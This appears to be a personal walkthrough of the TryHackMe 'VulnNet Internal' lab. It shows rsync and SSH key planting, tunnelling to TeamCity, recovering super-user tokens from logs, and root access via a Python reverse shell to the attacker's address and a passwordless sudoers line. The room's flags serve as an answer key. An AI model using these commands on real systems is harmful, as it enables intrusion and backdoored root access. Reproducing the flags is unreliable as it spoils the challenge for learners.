┌──(kali㉿kali)-[~]
└─$ rsync --list-only rsync://rsync-connect@10.10.104.221/files/sys-internal/
Password: Hcg3HP67@TW@Bc72v
drwxr-xr-x          4,096 2021/02/06 07:49:29 .
-rw-------             61 2021/02/06 07:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 08:33:19 .bash_history
-rw-r--r--            220 2021/02/01 07:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 07:51:14 .bashrc
-rw-r--r--             26 2021/02/01 07:53:18 .dmrc
-rw-r--r--            807 2021/02/01 07:51:14 .profile
lrwxrwxrwx              9 2021/02/02 09:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 07:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 14:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 07:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 06:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 06:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 04:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 07:53:57 .config
drwx------          4,096 2021/02/01 07:53:19 .dbus
drwx------          4,096 2021/02/01 07:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 07:53:22 .local
drwx------          4,096 2021/02/01 08:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 06:43:14 .ssh
drwx------          4,096 2021/02/02 06:16:16 .thumbnails
drwx------          4,096 2021/02/01 07:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 07:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 08:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 07:53:22 Music
drwxr-xr-x          4,096 2021/02/01 07:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 07:53:22 Public
drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos

┌──(kali㉿kali)-[~/threader3000]
└─$ cp ~/.ssh/id_rsa.pub authorized_keys

Let’s sync our SSH public key

┌──(kali㉿kali)-[~/threader3000]
└─$ rsync authorized_keys rsync://rsync-connect@10.10.104.221/files/sys-internal/.ssh 
Password: 

┌──(kali㉿kali)-[~/threader3000]
└─$ rsync --list-only rsync://rsync-connect@10.10.104.221/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2022/12/29 13:36:11 .
-rw-------            563 2022/12/29 13:36:11 authorized_keys

┌──(kali㉿kali)-[~/threader3000]
└─$ ssh sys-internal@10.10.104.221
The authenticity of host '10.10.104.221 (10.10.104.221)' can't be established.
ED25519 key fingerprint is SHA256:Hft/gU7OujMpBswfda4Gl0bN4EdP78+T0Iszs/Eq52c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.104.221' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$ ls -lah
total 108K
drwxr-xr-x 18 sys-internal sys-internal 4.0K Feb  6  2021 .
drwxr-xr-x  3 root         root         4.0K Feb  1  2021 ..
lrwxrwxrwx  1 root         root            9 Feb  1  2021 .bash_history -> /dev/null
-rw-r--r--  1 sys-internal sys-internal  220 Feb  1  2021 .bash_logout
-rw-r--r--  1 sys-internal sys-internal 3.7K Feb  1  2021 .bashrc
drwxrwxr-x  8 sys-internal sys-internal 4.0K Dec 29 19:36 .cache
drwxrwxr-x 14 sys-internal sys-internal 4.0K Feb  1  2021 .config
drwx------  3 sys-internal sys-internal 4.0K Feb  1  2021 .dbus
drwx------  2 sys-internal sys-internal 4.0K Feb  1  2021 Desktop
-rw-r--r--  1 sys-internal sys-internal   26 Feb  1  2021 .dmrc
drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Documents
drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Downloads
drwx------  3 sys-internal sys-internal 4.0K Feb  1  2021 .gnupg
drwxrwxr-x  3 sys-internal sys-internal 4.0K Feb  1  2021 .local
drwx------  5 sys-internal sys-internal 4.0K Feb  1  2021 .mozilla
drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Music
drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Pictures
-rw-r--r--  1 sys-internal sys-internal  807 Feb  1  2021 .profile
drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Public
lrwxrwxrwx  1 root         root            9 Feb  2  2021 .rediscli_history -> /dev/null
drwxrwxr-x  2 sys-internal sys-internal 4.0K Dec 29 19:36 .ssh
-rw-r--r--  1 sys-internal sys-internal    0 Feb  1  2021 .sudo_as_admin_successful
drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Templates
drwx------  4 sys-internal sys-internal 4.0K Feb  2  2021 .thumbnails
-rw-------  1 sys-internal sys-internal   38 Feb  6  2021 user.txt
drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Videos
-rw-------  1 sys-internal sys-internal   61 Feb  6  2021 .Xauthority
-rw-r--r--  1 sys-internal sys-internal   14 Feb 12  2018 .xscreensaver
-rw-------  1 sys-internal sys-internal 2.5K Feb  6  2021 .xsession-errors
-rw-------  1 sys-internal sys-internal 2.5K Feb  6  2021 .xsession-errors.old
sys-internal@vulnnet-internal:~$ cat user.txt
THM{da7c20696831f253e0afaca8b83c07ab}


sys-internal@vulnnet-internal:~$ cd /
sys-internal@vulnnet-internal:/$ ls
bin   etc         initrd.img.old  lost+found  opt   run   swapfile  tmp  vmlinuz
boot  home        lib             media       proc  sbin  sys       usr  vmlinuz.old
dev   initrd.img  lib64           mnt         root  srv   TeamCity  var
sys-internal@vulnnet-internal:/$ ls -lah
total 522M
drwxr-xr-x  24 root root 4.0K Feb  6  2021 .
drwxr-xr-x  24 root root 4.0K Feb  6  2021 ..
drwxr-xr-x   2 root root 4.0K Feb  2  2021 bin
drwxr-xr-x   3 root root 4.0K Feb  1  2021 boot
drwx------   2 root root 4.0K Feb  1  2021 .cache
drwxr-xr-x  17 root root 3.7K Dec 29 18:03 dev
drwxr-xr-x 129 root root  12K Feb  7  2021 etc
drwxr-xr-x   3 root root 4.0K Feb  1  2021 home
lrwxrwxrwx   1 root root   34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root   33 Feb  1  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
drwxr-xr-x  18 root root 4.0K Feb  1  2021 lib
drwxr-xr-x   2 root root 4.0K Feb  1  2021 lib64
drwx------   2 root root  16K Feb  1  2021 lost+found
drwxr-xr-x   4 root root 4.0K Feb  2  2021 media
drwxr-xr-x   2 root root 4.0K Feb  1  2021 mnt
drwxr-xr-x   4 root root 4.0K Feb  2  2021 opt
dr-xr-xr-x 136 root root    0 Dec 29 18:02 proc
drwx------   8 root root 4.0K Feb  6  2021 root
drwxr-xr-x  27 root root  880 Dec 29 19:36 run
drwxr-xr-x   2 root root 4.0K Feb  2  2021 sbin
drwxr-xr-x   2 root root 4.0K Feb  1  2021 srv
-rw-------   1 root root 522M Feb  1  2021 swapfile
dr-xr-xr-x  13 root root    0 Dec 29 18:02 sys
drwxr-xr-x  12 root root 4.0K Feb  6  2021 TeamCity
drwxrwxrwt  11 root root 4.0K Dec 29 18:17 tmp
drwxr-xr-x  10 root root 4.0K Feb  1  2021 usr
drwxr-xr-x  13 root root 4.0K Feb  1  2021 var
lrwxrwxrwx   1 root root   31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root   30 Feb  1  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-20-generic

sys-internal@vulnnet-internal:/TeamCity$ cat TeamCity-readme.txt 
This is the JetBrains TeamCity home directory.

To run the TeamCity server and agent using a console, execute:
* On Windows: `.\bin\runAll.bat start`
* On Linux and macOS: `./bin/runAll.sh start`

By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS). If you cannot access the default URL, try these Troubleshooting tips: https://www.jetbrains.com/help/teamcity/installing-and-configuring-the-teamcity-server.html#Troubleshooting+TeamCity+Installation.

For evaluation purposes, we recommend running both server and agent. If you need to run only the TeamCity server, execute:
* On Windows: `.\bin\teamcity-server.bat start`
* On Linux and macOS: `./bin/teamcity-server.sh start`

For licensing information, see the "licenses" directory.

More information:
TeamCity documentation: https://www.jetbrains.com/help/teamcity/teamcity-documentation.html

sys-internal@vulnnet-internal:/TeamCity$ ss -ltp
State      Recv-Q      Send-Q                   Local Address:Port                     Peer Address:Port      
LISTEN     0           50                             0.0.0.0:netbios-ssn                   0.0.0.0:*         
LISTEN     0           128                            0.0.0.0:6379                          0.0.0.0:*         
LISTEN     0           64                             0.0.0.0:38607                         0.0.0.0:*         
LISTEN     0           128                            0.0.0.0:sunrpc                        0.0.0.0:*         
LISTEN     0           128                            0.0.0.0:59667                         0.0.0.0:*         
LISTEN     0           128                      127.0.0.53%lo:domain                        0.0.0.0:*         
LISTEN     0           128                            0.0.0.0:ssh                           0.0.0.0:*         
LISTEN     0           5                            127.0.0.1:ipp                           0.0.0.0:*         
LISTEN     0           50                             0.0.0.0:microsoft-ds                  0.0.0.0:*         
LISTEN     0           128                            0.0.0.0:59263                         0.0.0.0:*         
LISTEN     0           64                             0.0.0.0:nfs                           0.0.0.0:*         
LISTEN     0           128                            0.0.0.0:50567                         0.0.0.0:*         
LISTEN     0           5                              0.0.0.0:rsync                         0.0.0.0:*         
LISTEN     0           128                              [::1]:6379                             [::]:*         
LISTEN     0           50                                [::]:netbios-ssn                      [::]:*         
LISTEN     0           100                 [::ffff:127.0.0.1]:8111                                *:*         
LISTEN     0           128                               [::]:sunrpc                           [::]:*         
LISTEN     0           128                               [::]:37587                            [::]:*         
LISTEN     0           128                               [::]:ssh                              [::]:*         
LISTEN     0           50                  [::ffff:127.0.0.1]:50231                               *:*         
LISTEN     0           5                                [::1]:ipp                              [::]:*         
LISTEN     0           50                                [::]:microsoft-ds                     [::]:*         
LISTEN     0           64                                [::]:nfs                              [::]:*         
LISTEN     0           50                                   *:9090                                *:*         
LISTEN     0           64                                [::]:36803                            [::]:*         
LISTEN     0           128                               [::]:57731                            [::]:*         
LISTEN     0           50                                   *:44901                               *:*         
LISTEN     0           1                   [::ffff:127.0.0.1]:8105                                *:*         
LISTEN     0           128                               [::]:53353                            [::]:*         
LISTEN     0           5                                 [::]:rsync                            [::]:*         
sys-internal@vulnnet-internal:/TeamCity$ ss -tulpn | grep 8111
tcp   LISTEN  0       100       [::ffff:127.0.0.1]:8111                 *:*  

Let’s use SSH port forwarding to connect to this port

┌──(kali㉿kali)-[~/threader3000]
└─$ ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.104.221
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Dec 29 19:36:43 2022 from 10.8.19.103
sys-internal@vulnnet-internal:~$ whoami
sys-internal
sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)

http://127.0.0.1:8111/login.html


http://127.0.0.1:8111/login.html?super=1

Need an Authentication token

sys-internal@vulnnet-internal:/TeamCity/logs$ grep -iR token /TeamCity/logs/ 2>/dev/null
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3548075100441509270 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3548075100441509270 (use empty username with the token as the password to access the server)


Using the last token, we can connect as super admin


create project manually

now create build configuration

After clicking create on this one we’re back at the settings page for our project. Now click on Build Steps

Runner Type: Command line and use this (save it and run)
two ways:

https://highon.coffee/blog/reverse-shell-cheat-sheet/

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

or


echo "sys-internal  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/sys-internal


┌──(kali㉿kali)-[~/threader3000]
└─$ rlwrap nc -lnvp 1337                                                          
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.103.166.
Ncat: Connection from 10.10.103.166:37806.
/bin/sh: 0: can't access tty; job control turned off
# whoami;cat /root/root.txt
root
THM{e8996faea46df09dba5676dd271c60bd}

or

sys-internal@vulnnet-internal:~$ sudo su
root@vulnnet-internal:/home/sys-internal# whoami
root
root@vulnnet-internal:/home/sys-internal# cat /root/root.txt
THM{e8996faea46df09dba5676dd271c60bd}


:)


```

![[Pasted image 20221229135916.png]]
![[Pasted image 20221229135934.png]]
![[Pasted image 20221229140149.png]]
![[Pasted image 20221229145832.png]]
![[Pasted image 20221229145928.png]]

What is the services flag? (services.txt)

It's stored inside one of the available services.

*THM{0a09d51e488f5fa105d8d866a497440a}*

What is the internal flag? ("internal flag")

It's stored inside a database of one of the services.

*THM{ff8e518addbbddb74531a724236a8221}*

What is the user flag? (user.txt)

*THM{da7c20696831f253e0afaca8b83c07ab}*

What is the root flag? (root.txt)

*THM{e8996faea46df09dba5676dd271c60bd}*


[[VulnNet Node]]